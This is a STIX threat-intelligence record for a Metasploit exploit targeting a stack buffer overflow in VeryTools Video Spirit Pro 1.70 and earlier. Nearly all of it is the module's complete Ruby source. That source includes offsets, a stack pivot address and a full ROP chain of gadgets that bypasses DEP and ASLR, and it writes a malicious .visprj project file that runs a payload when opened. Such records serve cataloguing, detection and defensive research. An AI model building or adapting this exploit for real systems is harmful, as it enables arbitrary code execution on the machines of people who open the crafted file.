{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0ebcde3c-27f6-4039-b2a5-80b8a534dac3",
    "created": "2024-08-14T16:38:01.805832Z",
    "modified": "2024-08-14T16:38:01.805836Z",
    "name": "VeryTools Video Spirit Pro",
    "description": " This module exploits a stack buffer overflow in Video Spirit <= 1.70. When opening a malicious project file (.visprj), a stack buffer overflow occurs resulting in arbitrary code execution. This exploit bypasses DEP & ASLR, and works on XP, Vista & Windows 7.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/videospirit_visprj.rb",
            "external_id": "videospirit_visprj.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-0499"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-0500"
        },
        {
            "source_name": "reference",
            "url": "http://www.corelan.be/advisories.php?id=CORELAN-11-001"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'VeryTools Video Spirit Pro',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Video Spirit <= 1.70.\n        When opening a malicious project file (.visprj), a stack buffer overflow occurs,\n        resulting in arbitrary code execution.\n        This exploit bypasses DEP & ASLR, and works on XP, Vista & Windows 7.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Acidgen',      #found the vulnerability\n          'corelanc0d3r <peter.ve[at]corelan.be>', #rop exploit + msf module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2011-0499'],\n          [ 'CVE', '2011-0500'],\n          [ 'OSVDB', '70619'],\n          [ 'URL', 'http://www.corelan.be/advisories.php?id=CORELAN-11-001' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'        => 800,  #0x320 bytes - avoid marking wrong page as RWX\n          'BadChars'     => \"\\x00\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x21\\x22\\x26\\x27\\x2f\\x3c\\x3e\",\n          'DisableNops'  => 'True',\n        },\n      'Platform' => 'win',\n      'Targets'  =>\n        [\n          [ 'Windows XP/Vista/Win7/... Generic DEP & ASLR Bypass',\n            {\n              'OffSet'      => 168,\n              'OffSetToRop' => 952,\n              'Ret'         => 0x1006CC10, #overlayplug.dll stackpivot bad char friendly\n            }\n          ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2011-04-11',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ true, 'VideoSpirit project name.',  'msf.visprj']),\n      ])\n  end\n\n  def junk\n    return rand_text_alphanumeric(4).unpack(\"L\")[0].to_i\n  end\n\n  def exploit\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n\n    header = %Q|\n<version value=\"1\" />\n<track>\n<type value=\"0\" />\n<type value=\"4\" />\n<type value=\"2\" />\n<type value=\"1\" />\n<type value=\"7\" />\n</track>\n<track0 />\n<track1 />\n<track2 />\n<track3 />\n<track4 />\n<clip />\n<output typename=\"AVI\" keepaspect=\"0\" presetquality=\"0\">\n<type0 enable=\"1\">\n|\n\n    footer = %Q|\n<valitem name=\"320*240(4:3)\" value=\"320*240\" />\n<valitem name=\"30\" value=\"30\" />\n<valitem name=\"16000k\" value=\"16000k\" />\n</type0>\n<type1 enable=\"1\">\n<valitem name=\"mp3\" value=\"libmp3lame\" />\n<valitem name=\"128k\" value=\"128k\" />\n<valitem name=\"44100\" value=\"44100\" />\n<valitem name=\"2 (Stereo)\" value=\"2\" />\n</type1>\n<type2 enable=\"0\" />\n</output>\n|\n    print_status(\"Preparing payload\")\n\n    pivot = [target.ret].pack('V')\n\n    rop_gadgets =\n    [\n      # one non-ASLR module is enough for generic ASLR & DEP bypass !\n      # pvefindaddr rop 'n roll\n      # First, grab VirtualProtect ptr\n      0x10065292,  # POP EAX # RETN      [OverlayPlug.dll]\n      0x106F4244,  # IAT entry + offsqet (bad char friendly)\n      0x10019762,  # POP EBP # RETN      [OverlayPlug.dll]\n      0xEFEFEFF0,  # bye bye offset\n      0x10084977,  # ADD EBP,EAX # RETN  [OverlayPlug.dll]\n      0x100684B8,  # MOV EAX,EBP # POP ESI # POP EBP # POP EBX # RETN  [OverlayPlug.dll]\n      junk,\n      junk,\n      junk,\n      0x1005E114,  # MOV EAX,DWORD PTR DS:[EAX] # RETN  [OverlayPlug.dll]\n      0x10016A56,  # XCHG EAX,ESI         [OverlayPlug.dll]\n\n      # set size\n      0x100A9274,  # POP EAX # RETN       [OverlayPlug.dll]\n      0x10101330,  # 0x320 bytes - change this if needed, but don't make it too big :)\n      0x10019762,  # POP EBP # RETN       [OverlayPlug.dll]\n      0xEFEFEFF0,  # boo\n      0x10084977,  # ADD EBP,EAX # RETN   [OverlayPlug.dll]\n      0x10053E4C,  # XCHG EAX,EBP # RETN  [OverlayPlug.dll]\n      0x10066D8C,  # PUSH EAX # ADD AL,5D # POP EBX # MOV DWORD PTR FS:[0],ECX # ADD ESP,50 # RETN 10  [OverlayPlug.dll]\n      junk,\n      junk,\n      junk,\n      junk,\n      junk,\n      junk,\n      junk,\n      junk,\n      junk,\n      junk,\n      junk,\n      junk,\n      junk,\n      junk,\n      junk,\n      junk,\n      junk,\n      junk,\n      junk,\n      junk,\n\n      # set NewProtect to 0x40\n      0x100E3D4A,  # XOR EAX,EAX # XOR EDX,EDX # RETN  [OverlayPlug.dll]\n      junk,\n      junk,\n      junk,\n      junk,\n      0x10010C36,  # ADD EAX,10 # POP EBP # RETN 4  [OverlayPlug.dll]\n      junk,\n      0x10010C36,  # ADD EAX,10 # POP EBP # RETN 4  [OverlayPlug.dll]\n      junk,\n      junk,\n      0x10010C36,  # ADD EAX,10 # POP EBP # RETN 4  [OverlayPlug.dll]\n      junk,\n      junk,\n      0x10010C36,  # ADD EAX,10 # POP EBP # RETN 4  [OverlayPlug.dll]\n      junk,\n      junk,\n      0x10030C8B,  # ADD DL,AL # ADD AL,0 # MOV EAX,EDX # RETN 4  [OverlayPlug.dll]\n      junk,\n\n      # write pOldProtect to .data section\n      0x1001AB51,  # POP ECX # RETN  [OverlayPlug.dll]\n      junk,\n      0x10117030,  # RW\n\n      # EDI : ROP NOP\n      0x10057090,  # POP EDI # RETN  [OverlayPlug.dll]\n      0x10057091,  # ROP NOP\n\n      # pReturn2Payload\n      0x100BC8E8,  # PUSH ESP # MOV EAX,ESI # POP ESI # RETN  [OverlayPlug.dll]\n      0x10016A56,  # XCHG EAX,ESI # RETN  [OverlayPlug.dll]\n      0x1003C946,  # ADD EAX,0A # RETN    [OverlayPlug.dll]\n      0x1003C946,\n      0x1003C946,\n      0x1003C946,\n      0x1003C946,\n      0x1003C946,\n      0x1003C946,\n      0x1003C946,\n      0x1003C946,\n      0x1003C946,\n      0x1003C946,\n      0x1003C946,\n      0x1003C946,\n      0x1003C946,\n      0x1003C946,\n      0x1003C946,\n      0x1003C946,\n      0x1003C946,\n      0x1003C946,\n      0x1003C946,\n      0x1001FDBD,  # XCHG EAX,EBP # RETN  [OverlayPlug.dll]\n\n      0x100A9274,  # POP EAX # RETN       [OverlayPlug.dll]\n      0x41414141,\n\n      # go\n      0x10066F84,  # PUSHAD # RETN        [OverlayPlug.dll]\n    ].pack(\"V*\")\n\n\n    buffer = \"<valitem name=\"\n    buffer << '\"'\n    buffer << rand_text_alphanumeric((target['OffSet']))\n    buffer << rand_text_alphanumeric(4) #nseh\n    buffer << pivot\n    buffer << rand_text_alphanumeric((target['OffSetToRop']))\n    buffer << \"\\x91\\x70\\x05\\x10\" * 10   #rop nop, offset Win7\n    buffer << rop_gadgets\n    buffer << make_nops(150)\n    buffer << payload.encoded\n    buffer << rand_text_alphanumeric(4000)\n    buffer << '\"'\n    buffer << ' value=\"msmpeg4v2\"'\n    buffer << \"/>\"\n    buffer << \"\\n\"\n\n    filecontent = header + buffer + footer\n\n    print_status(\"Writing payload to file\")\n\n    file_create(filecontent)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-04-11",
    "x_mitre_platforms": [
        "win'"
    ]
}